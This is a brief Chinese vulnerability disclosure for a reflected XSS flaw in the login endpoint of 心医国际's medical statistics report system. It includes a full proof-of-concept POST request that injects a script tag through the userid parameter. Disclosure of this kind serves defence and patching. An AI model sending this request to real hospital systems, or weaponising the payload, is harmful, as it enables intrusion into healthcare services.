# 心医国际医技统计报表系统存在XSS漏洞

**<font style="color:rgb(38, 38, 38);">一、漏洞简介</font>**<font style="color:rgb(38, 38, 38);">  
</font><font style="color:rgb(38, 38, 38);">心医国际是中国专业的医疗云应用解决方案提供商，铺建并运营全国领先的智能医疗云平台，依托十年的数据积累和业务实践，持续创新智能医疗场景应用。业务服务覆盖诊疗、教学、科研、管理等多维度，助力政府、医院及产业合作伙伴，打造线上线下高效协同的智慧医疗健康服务体系，目前已建成覆盖全国31个省，联结2万余家医疗机构的智能医疗云平台，助力建设并服务青海、河南、陕西、山西、贵州、新疆、江西、广西、甘肃9大省级远程医疗平台，服务通达80%全国三甲级医院;成功建设并服务全国300余个省、市、县及专科医联体。心心医国际医技统计报表系统存在XSS漏洞  
</font>**<font style="color:rgb(38, 38, 38);">二、影响版本</font>**<font style="color:rgb(38, 38, 38);">  
</font><font style="color:rgb(38, 38, 38);">心医国际医技统计报表</font>![1714374819079-557cb0bb-eb99-43fd-bdbe-e10c186b405f.png](./img/4yG1B6lXa12dD60v/1714374819079-557cb0bb-eb99-43fd-bdbe-e10c186b405f-348600.png)<font style="color:rgb(38, 38, 38);">  
</font>**<font style="color:rgb(38, 38, 38);">三、漏洞复现</font>**

```plain
POST /EasyReport/login.do?method=handleRequestInternal HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0
Content-Length: 55
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Language: zh-CN,zh;q=0.9
Cache-Control: max-age=0
Content-Type: application/x-www-form-urlencoded
Cookie: JSESSIONID=E590069FD1A0C5B3ACA365A9A270FD01
Upgrade-Insecure-Requests: 1
Accept-Encoding: gzip

pwd=admin&userid="><ScRiPt>alert(1)</sCrIpT>&userrole=0
```

![1714378510351-d404cf53-907d-4f32-8083-9eef103238d9.png](./img/4yG1B6lXa12dD60v/1714378510351-d404cf53-907d-4f32-8083-9eef103238d9-698289.png)



> 更新: 2024-06-17 09:27:35  
> 原文: <https://www.yuque.com/xiaokp7/ocvun2/py7flewrq4o85dbe>